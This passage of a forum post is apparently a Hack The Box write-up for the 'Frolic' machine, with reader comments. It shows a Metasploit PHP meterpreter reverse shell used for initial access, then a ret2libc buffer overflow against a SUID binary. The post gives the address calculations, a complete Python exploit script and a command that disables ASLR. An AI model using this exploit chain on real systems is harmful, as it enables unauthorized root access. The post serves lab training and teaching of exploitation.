<p>The picture above is part of the output of a ‚Äúshow info‚Äù command, but if we type ‚Äúshow options‚Äù we also get information regarding the default payload of the exploit and its settings, in this case the module includes a PHP reverse TCP meterpreter shell so we only have to specify our IP inside the HTB network and a port to start our listener:</p>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/9/9d7b4bfc562a86db13a12f5411e06faf2e12e3f1.png" alt="image" data-base62-sha1="mt97KNnzBGY4CdWO4JRjnm3fRst" width="690" height="116"></p>
<p>We already know everything we need to launch the exploit, so it only takes a few seconds to land successfully on the box:</p>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/6/6c5bbf028bbaee44030115cd5a15901e42391d2b.png" alt="image" data-base62-sha1="fsA8bn9TFe1FkFVnlPmHnclqnaz" width="690" height="336"></p>
<p>Now we should look for our first flag. Here I like to spawn a normal shell instead of using meterpreter‚Äôs weird commands, and because we receive a non-interactive bash shell I use Python to spawn a new instance of /bin/bash that makes our job a little easier, then I look at the content of the /home/ folder to see what users there are on the box, and inside the Ayush folder we find our user.txt flag, and also a curious little hidden folder that we would have missed without the ‚Äú-la‚Äù option:</p>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/7/7f2e451b825f1bd4fad564632bc1edb61ee1d883.png" alt="image" data-base62-sha1="i95LQg9uyD34X2GMuL3GwNm1TPl" width="690" height="331"></p>
<p>Let‚Äôs see what it contains then:</p>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/4/4df27b36614d44f317356395032235d8b200c760.png" alt="image" data-base62-sha1="b7yhiw3KI3Qg7WdjHM7kW7NuBRS" width="440" height="128"></p>
<p>We only have one executable, but by looking carefully we spot the "s" between its permissions, meaning the program has the SUID bit set and can be run with root privileges, weird coincidence. We should take a closer look by downloading it on our own box for further testing:</p>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/2/2c82d5942808b9b07efd3b27ef157472eea5494c.png" alt="image" data-base62-sha1="6lLjPBKI3rPIcojrNix2o1WpzNG" width="530" height="147"></p>
<p><strong>Some theory on buffer overflows:</strong></p>
<p>Now that we have the binary on our VM we can run it to see how it works:</p>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/c/c6d38b2fe956955c427b6ccefa4c5b1d800decb4.png" alt="image" data-base62-sha1="smTLHI1wWb06hramwZuP8NVIWSE" width="690" height="139"></p>
<p>Apparently this program asks for a message that is taken from its command line arguments and then sends it somewhere in some way (it doesn‚Äôt matter for this box), and once that is done the same message is printed back on stdout to communicate a successful operation. The most interesting part about all this though is how this behavior makes it vulnerable to a buffer overflow, in fact the error I received in the last line of output is a segmentation error, which means the program has just tried to access an invalid memory address, or one that it is not supposed to access at all. This is not too surprising considering the binary is called ‚Äúrop‚Äù, which is short for Return-Oriented Programming, a technique used to bypass common buffer overflow mitigation techniques (although it‚Äôs not needed in this box).</p>
<p>If you‚Äôre not familiar with buffer overflow vulnerabilities, this happens because the program is trying to copy data that it receives as input into a fixed length area of memory without making proper checks about the size of that data, so if we give the program a bigger bunch of data than the variable that is supposed to contain it said data will literally overflow and overwrite nearby memory addresses.</p>
<p>Local variables are saved in a memory segment called stack, and in the same memory segment, not too many bytes away from our local variables, we also have a 4 bytes long value (on x86 architectures at least) that is supposed to be the memory address the CPU will have to jump to when returning from the current function, so technically it‚Äôs the address of the instruction after the call to the function we‚Äôre in right now.</p>
<p>I used Python to give our rop binary a string of 100 characters as input, and we received a segmentation error because the string was so long it overwrote the return address of the function on the stack, so when the function returned the CPU tried to access a memory address that looks like this: 0x41414141 (41 is ‚ÄúA‚Äù in hexadecimal), an address that the program cannot access, so it exited with an error. Our goal is to overwrite that return address with one that points to some useful instructions, granting us arbitrary code execution. If this sounds confusing and you never programmed in C before I suggest you to study this beautiful language and practice it for some time, it‚Äôs essential in order to exploit flaws like this, so from now on I‚Äôm going to assume you already understand the basic concept of a simple buffer overflow vulnerability. I also recommend to read a thing or two about <a href="../../../external.html?link=https://aaronbloomfield.github.io/pdr/book/x86-32bit-ccc-chapter.pdf" rel="noopener nofollow ugc">gcc‚Äôs x86 calling convention</a>, it‚Äôs what dictates how functions must be called and where the parameters are expected to be in memory, these are all things we must keep in mind while writing a buffer overflow exploit.</p>
<p>So we know we have a binary vulnerable to a buffer overflow, which also happens to have the SUID bit set, this is very useful because if we manage to spawn a shell through the buffer overflow that shell will be run as root, and we‚Äôll get to grab the last flag. It‚Äôs clear that this is the right path to follow, so it‚Äôs time to get our hands dirty. For exploit development on Linux I use GDB + Peda.py, which offers many incredibly useful features for our scope. You can download Peda.py <a href="../../../external.html?link=https://github.com/longld/peda" rel="noopener nofollow ugc">here</a>. When everything is ready we can load the program and run the ‚Äúchecksec‚Äù command to see which security measures are enabled on the binary, we‚Äôll have to consider different approaches based on what we find:</p>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/c/c3593d829fde87344502419a485336309854705a.png" alt="image" data-base62-sha1="rS8iNhDxlKO9M3xySlley5lPvpU" width="590" height="169"></p>
<p>NX is enabled, and NX means the stack is not executable. In the most basic case of a buffer overflow exploit a shellcode is injected in the overflowing buffer and the return address is overwritten with a pointer to that shellcode, which will cause it to execute as soon as the function tries to return to its original caller. Because the shellcode is being saved inside the buffer it will end up on the stack, and one of the many mitigation techniques that try to prevent these attacks is the NX bit, which marks the entire stack region as non-executable, so the CPU can only read and write data on the stack, but it cannot execute instructions from it. This makes us unable to inject shellcode in the buffer, but there are workarounds.</p>
<p>If we have control of the return address we can set its value as whatever we please, so we can make it point to a bunch of instructions that our program is going to load at runtime anyway, and they are being loaded with the only purpose of being executed, so NX can‚Äôt do anything to prevent this attack. Every dynamically linked C program in Linux copies in its address space a dynamic library called libc, which contains many useful functions used to interact with the operating system, one of which is system(), that can run shell commands. An attack that uses libc functions to exploit a buffer overflow is called a ret2libc, because we are going to overwrite the return address with the memory address of the system() function to make it spawn a new shell.</p>
<p><strong>Gathering all the pieces:</strong></p>
<p>Alright, that‚Äôs enough theory for now. Let‚Äôs go back to work. We know what attack we want to launch, but we also need to know if ASLR (Address Space Layout Randomization) is enabled on the box, because if it is then memory regions will be allocated at random addresses every time and it would make our exploit more complicated. To find out if ASLR is enabled we can use ‚Äúldd‚Äù to show which dynamic libraries the rop binary loads during runtime, their memory addresses will be shown, if we run the command multiple times and the addresses never change ASLR is disabled and we can copy the address of the libc library because we‚Äôre going to need it for our exploit:</p>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/e/ed602489560621ddaedb0c49a60d733e47950319.png" alt="image" data-base62-sha1="xRV90D59YAZiAg1H9pnzw0tZDcJ" width="620" height="400"></p>
<p>The address stays the same! Good, let‚Äôs write it down for later:</p>
<pre><code>libc_base_address = 0xb7e19000
</code></pre>
<p>This is the address where the code of libc begins in memory when our program is being executed. Because it‚Äôs part of our binary‚Äôs address space we are authorized to access it anytime. Next we should find the specific address of the system() function: this task would be very easy if gdb was installed on Frolic, however we don‚Äôt have it at hand, but there are still other ways to find the addresses we need. I‚Äôm going to do it by using objdump:</p>
<pre><code>objdump -TC /lib/i386-linux-gnu/libc.so.6 | grep " system$"
</code></pre>
<p>This command will output the offset where system() is located inside libc (I got the path of the library from the output of ldd above), so it‚Äôs not an absolute memory address, in order to know where system() will be loaded during runtime we need to add the offset to the base address we found above:</p>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/2/2929b56bde3b685b3cd3629b65b2d7f9254ee3ee.png" alt="image" data-base62-sha1="5S8W4JVs9fvoqnGRl6KjYmLp9Zs" width="690" height="58"></p>
<pre><code>system_address = libc_base_address + system_offset = 0xb7e19000 + 0x0003ada0 = 0xb7e53da0
</code></pre>
<p>Great, we have the address that will be loaded inside the EIP register to redirect execution! However system() needs an important parameter to work, which is the path of the program to be called. Since we want to spawn a shell the call to system() must look like this:</p>
<pre><code>system("/bin/sh")
</code></pre>
<p>The x86 calling convention says that function parameters must be passed on the stack, and when the parameter is a string a pointer to the string must be pushed on the stack instead, so we must find a pointer to the ‚Äú/bin/sh‚Äù string to set on the stack so that system() will take it as parameter and execute it. This time we can do it with the ‚Äústrings‚Äù command, by looking for the offset of that string inside the libc library our rop binary uses on the box:</p>
<pre><code>strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep '/bin/sh'
</code></pre>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/9/9be6a251dd3c614921455d773087600e87171572.png" alt="image" data-base62-sha1="mfa8CLF0JKHhXWgn3SVDsIGHSCu" width="690" height="56"></p>
<p>And there we go, we have found another offset. Like before we can calculate where the string will be loaded at runtime with a simple addition:</p>
<pre><code>string_address = libc_base_address + string_offset = 0xb7e19000 + 0x0015ba0b = 0xb7f74a0b
</code></pre>
<p>The last memory address we need to write our exploit is a fake return address, because we are trying to emulate a proper call to a new function and the calling convention states we must provide a return address that will be used to pick up execution once the function we are trying to call exits. This isn‚Äôt something we should worry about though, it can be 4 bytes of junk, they will cause the program to crash when we close our shell but they won‚Äôt have any effect for as long as we are running it, so it doesn‚Äôt matter:</p>
<pre><code>exit_address = 0xaabbccdd
</code></pre>
<p>There, now we have all the addresses we need. We‚Äôre only missing one important piece: where the hell is the return address we want overwrite? Of course we need to know where it is in order to change its value, so let‚Äôs get to it, I‚Äôm going to use GDB + Peda.py and this will make it very fast. The way to do it is very simple, first we generate a very long pattern of characters which never repeat, then we feed the program with that pattern and we observe which characters overwrite the EIP register, those will be the characters that overwrote the return address, so if we get the offset of those characters from the full pattern we will know exactly how many bytes of data we need to reach the return address. Peda already has a built-in command to generate such patterns, so I‚Äôm going to load the rop binary on GDB, generate a pattern, give it as input to the program, and see what happens:</p>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/3/34372c92b6ff60f5d5d82a743971942dd21181ed.png" alt="image" data-base62-sha1="7rV2nPjVmIhfpJTLpAVP3NVXUOp" width="690" height="84"></p>
<p>The program crashed, in fact Peda will cover the terminal with the current state of every register, the stack, and some instructions found near the current content of EIP:</p>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/b/bd81682e20262e4697ea4eec7c3c11cc960ee9d8.png" alt="image" data-base62-sha1="r2ruGUDQXhBNTOZVSbYLvA7Tncs" width="690" height="329"></p>
<p>The content of EIP at the moment of the crash is 0x41474141, which is a little endian hexadecimal representation of the string "AAGA", so part of the pattern definitely overwrote the return address, and we can see a big portion of the stack has been overwritten with our pattern as well. What offset of the string reached EIP though?</p>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/5/56dba2e4a13d7d86c8e9c0c464e14000ff70c8b3.png" alt="image" data-base62-sha1="conD7O6zmIIou8BoGIPwrojyNgL" width="274" height="61"></p>
<p>Well here we have our answer, the string ‚ÄúAAGA‚Äù begins exactly 52 bytes after the start of the original pattern, so in our exploit we are going to need 52 bytes of garbage before we can inject our malicious return address. And this is really it, we finally have every piece of information we need to write our exploit!</p>
<p><strong>Writing the exploit:</strong></p>
<p>I like to write my exploits in Python so I went for this language. Here is the final result, where all I do is implementing the calling convention to trick the CPU into calling the system() function with the string ‚Äú/bin/sh‚Äù as its only parameter and using a bogus return address:</p>
<pre><code class="lang-python">import struct  

# addresses from Frolic:
"""
system_address = struct.pack("&lt;I", 0xb7e53da0)
exit_address = struct.pack("&lt;I", 0xaabbccdd)
string_address = struct.pack("&lt;I", 0xb7f74a0b)
"""

# addresses from Kali to test it locally:
system_address = struct.pack("&lt;I", 0xf7e0d980)
exit_address = struct.pack("&lt;I", 0xaabbccdd)
string_address = struct.pack("&lt;I", 0xf7f4daaa)

# fill the buffer with junk:
buffer = "A" * 52

# place the arguments for the call to system() on the stack, following the order defined by the calling convention:
buffer += system_address
buffer += exit_address
buffer += string_address

# finally feed the program with the malicious payload
print buffer
</code></pre>
<p>If you‚Äôre wondering what all those struct.pack functions do they convert the hexadecimal addresses we give them into little endian ("&lt;I") arrays of bytes because we are dealing with a x86 CPU, so the little endian notation must be used. Also notice that I obtained the memory addresses of system() and of ‚Äú/bin/sh‚Äù from my Kali box as well so I could test the exploit locally before uploading it, if you want to do that too you should remember to disable ASLR because it‚Äôs enabled by default on modern kernels, to do that run this command:</p>
<pre><code>echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
</code></pre>
<p>ASLR will be re-enabled automatically as soon as the system is rebooted, or you can just echo 2 instead of 0 into the same file when you‚Äôre done messing with the exploit. Let‚Äôs test it now and see if our Python script works:</p>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/0/0960f62db220ed2a0b7cce120a5f8fb28bc7557f.png" alt="image" data-base62-sha1="1kY2gBFhgnqXSH7AT6TTF3IMRt5" width="366" height="116"></p>
<p>It does! As soon as we feed the output of our exploit to ./rop we enter a root shell! And just as we expected, exiting causes another segfault because the program is trying to jump back to the junk return address we provided.</p>
<p><strong>Privilege escalation using the custom exploit:</strong></p>
<p>Let‚Äôs upload this sexy exploit to the box after removing the comments from the original addresses and see if it works there as well:</p>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/3/3cfc69012145343e43d161b0b233a0b2c50539a8.png" alt="image" data-base62-sha1="8HvqWkyVnonUQ02ZqHrbLh7dSaY" width="639" height="292"></p>
<p>And the system got owned! A quick summary of these last few actions I performed:</p>
<ol>
<li>I changed directory to /tmp in order to have write permissions in the working directory, then uploaded the exploit</li>
<li>I started a shell session from the meterpreter command line</li>
<li>Because the obtained shell isn‚Äôt interactive I spawned a semi-interactive one through a Python one-liner</li>
<li>I run the program in Ayush‚Äôs home folder</li>
<li>BAM! Rooted!</li>
</ol>
<p>I thought this was a really fun box, especially the privilege escalation part because I love software exploitation and I wish there were more boxes on HTB that required it. Although maybe I would have given 30 points for this, not just 20, but oh well it‚Äôs too late now. If you have any questions let me know in the comments, I hope you enjoyed this writeup.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="11" />
              <span class='post-likes'>11 Likes</span>
            </div>


            
          </div>
          <div id='post_2' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/badcor.html'><span itemprop='name'>badcor</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2019-03-24T14:03:32Z' class='post-time'>
                    March 24, 2019,  2:03pm
                  </time>
                  <meta itemprop='dateModified' content='2019-03-24T14:03:32Z'>
              <span itemprop='position'>2</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Very nice Baud, thank you for this writeup. The buffer overflow part is very neat and interesting ! <img src="../../../0x00sec.org/images/emoji/twitter/%2b1c164.html?v=9" title=":+1:" class="emoji" alt=":+1:"></p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
          <div id='post_3' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/laxudope.html'><span itemprop='name'>laxudope</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2019-03-24T14:07:23Z' class='post-time'>
                    March 24, 2019,  2:07pm
                  </time>
                  <meta itemprop='dateModified' content='2019-03-24T14:07:23Z'>
              <span itemprop='position'>3</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>As I remember, GDB was not installed on that box. How did you installed that?</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_4' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/Baud.html'><span itemprop='name'>Baud</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2019-03-24T15:41:45Z' class='post-time'>
                    March 24, 2019,  3:41pm
                  </time>
                  <meta itemprop='dateModified' content='2019-03-24T15:41:45Z'>
              <span itemprop='position'>4</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <aside class="quote no-group" data-username="badcor" data-post="2" data-topic="12478">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="24" height="24" src="../../user_avatar/d.clarkee.co.uk/badcor/48/9538_2.png" class="avatar"> badcor:</div>
<blockquote>
<p>Very nice Baud, thank you for this writeup. The buffer overflow part is very neat and interesting ! <img src="../../images/emoji/twitter/%2b18e5e.png?v=15" title=":+1:" class="emoji" alt=":+1:" loading="lazy" width="20" height="20"></p>
</blockquote>
</aside>
<p>Thank you for the feedback! I‚Äôm glad you appreciated it.</p>
<aside class="quote no-group" data-username="laxudope" data-post="3" data-topic="12478" data-full="true">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="24" height="24" src="../../letter_avatar_proxy/v4/letter/l/e47774/48.png" class="avatar"> laxudope:</div>
<blockquote>
<p>As I remember, GDB was not installed on that box. How did you installed that?</p>
</blockquote>
</aside>
<p>I didn‚Äôt, GDB was running on my local Kali machine, that‚Äôs where I did all the debugging. I also specified it here:</p>
<aside class="quote group-VIP" data-username="Baud" data-post="1" data-topic="12478">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="24" height="24" src="../../user_avatar/d.clarkee.co.uk/baud/48/5512_2.png" class="avatar"> Baud:</div>
<blockquote>
<p>this task would be very easy if gdb was installed on Frolic, however we don‚Äôt have it at hand, but there are still other ways to find the addresses we need.</p>
</blockquote>
</aside>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_5' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/laxudope.html'><span itemprop='name'>laxudope</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2019-03-24T17:37:51Z' class='post-time'>
                    March 24, 2019,  5:37pm
                  </time>
                  <meta itemprop='dateModified' content='2019-03-24T17:46:20Z'>
              <span itemprop='position'>5</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <aside class="quote group-VIP" data-username="Baud" data-post="1" data-topic="12478">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="24" height="24" src="../../user_avatar/d.clarkee.co.uk/baud/48/5512_2.png" class="avatar"> Baud:</div>
<blockquote>
<p>this task would be very easy if gdb was installed on Frolic, however we don‚Äôt have it at hand, but there are still other ways to find the addresses we need.</p>
</blockquote>
</aside>
<p>I want to know how did you manage to get the 52 offset? I was stuck there. Since no GDB was installed, so I was unable to capture the offset of eip overwrite.</p>
<p>And according to IPSEC OCT video, it was needed to replicate the whole operating system installation in vm and then we can implement that on our system</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_6' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/vict0ni.html'><span itemprop='name'>vict0ni</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2019-03-24T18:14:21Z' class='post-time'>
                    March 24, 2019,  6:14pm
                  </time>
                  <meta itemprop='dateModified' content='2019-03-24T18:14:21Z'>
              <span itemprop='position'>6</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <aside class="quote group-VIP" data-username="Baud" data-post="1" data-topic="12478">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="24" height="24" src="../../user_avatar/d.clarkee.co.uk/baud/48/5512_2.png" class="avatar"> Baud:</div>
<blockquote>
<p>Good, more nonsense.</p>
</blockquote>
</aside>
<p>The path for user in 3 words. Still not <strong>that</strong> bad tho, I got to use a known cve. Nice Writeup <img src="../../images/emoji/twitter/smiley8e5e.png?v=15" title=":smiley:" class="emoji" alt=":smiley:" loading="lazy" width="20" height="20"></p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
          <div id='post_7' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/Baud.html'><span itemprop='name'>Baud</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2019-03-24T19:11:23Z' class='post-time'>
                    March 24, 2019,  7:11pm
                  </time>
                  <meta itemprop='dateModified' content='2019-03-24T19:11:23Z'>
              <span itemprop='position'>7</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <aside class="quote no-group" data-username="laxudope" data-post="5" data-topic="12478">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="24" height="24" src="../../letter_avatar_proxy/v4/letter/l/e47774/48.png" class="avatar"> laxudope:</div>
<blockquote>
<p>I want to know how did you manage to get the 52 offset? I was stuck there. Since no GDB was installed, so I was unable to capture the offset of eip overwrite.</p>
<p>And according to IPSEC OCT video, it was needed to replicate the whole operating system installation in vm and then we can implement that on our system</p>
</blockquote>
</aside>
<p>I saw his October‚Äôs video, he gets the number of bytes needed to get to the return address by using two Ruby scripts included in the Metasploit framework, I do it directly from my installation of GDB because PEDA.py happens to have a function to do just that, I included pictures of every step in the writeup.</p>
<p>Creating a VM with the same exact OS as your target is one way to get the right addresses locally, but why do that when you can just find them using other utilities directly from Frolic? Objdump gave me the address of system(), strings of ‚Äú/bin/sh‚Äù, and ldd for the base address of libc.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_8' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/MaangoTaachyon.html'><span itemprop='name'>MaangoTaachyon</span></a>
                (Maango Taachyon)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2019-03-24T21:21:36Z' class='post-time'>
                    March 24, 2019,  9:21pm
                  </time>
                  <meta itemprop='dateModified' content='2019-03-24T21:21:36Z'>
              <span itemprop='position'>8</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>This was detailed, well written, and attention captivating throughout. Wonderful job putting the process into words</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
          <div id='post_9' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/hoboscientist.html'><span itemprop='name'>hoboscientist</span></a>
                (he not busy being born is busy dying)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2019-03-25T13:38:17Z' class='post-time'>
                    March 25, 2019,  1:38pm
                  </time>
                  <meta itemprop='dateModified' content='2019-03-25T13:38:17Z'>
              <span itemprop='position'>9</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Real nice write up <a class="mention" href="../../u/baud-2.html">@Baud</a>. Very carefully written and well presented. I can‚Äôt wait to apply what I‚Äôve learned from this post to the ROP binary. Kudos champ.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
    </div>


    




    </div>
    <footer class="container wrap">
  <nav class='crawler-nav'>
    <ul>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../index.html' itemprop="url">Home </a>
        </span>
      </li>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../categories.html' itemprop="url">Categories </a>
        </span>
      </li>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../guidelines.html' itemprop="url">Guidelines </a>
        </span>
      </li>
        <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='../../tos.html' itemprop="url">Terms of Service </a>
          </span>
        </li>
        <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='../../privacy.html' itemprop="url">Privacy Policy </a>
          </span>
        </li>
    </ul>
  </nav>
  <p class='powered-by-link'>Powered by <a href="../../../external.html?link=https://www.discourse.org/">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>

    
    <script src="../../../external.html?link=http://instant.page/3.0.0" type="module" defer="" integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1" nonce="YSiX4FhfwzZuN3KVdXoanMAJY"></script>
  </body>
  
</html>
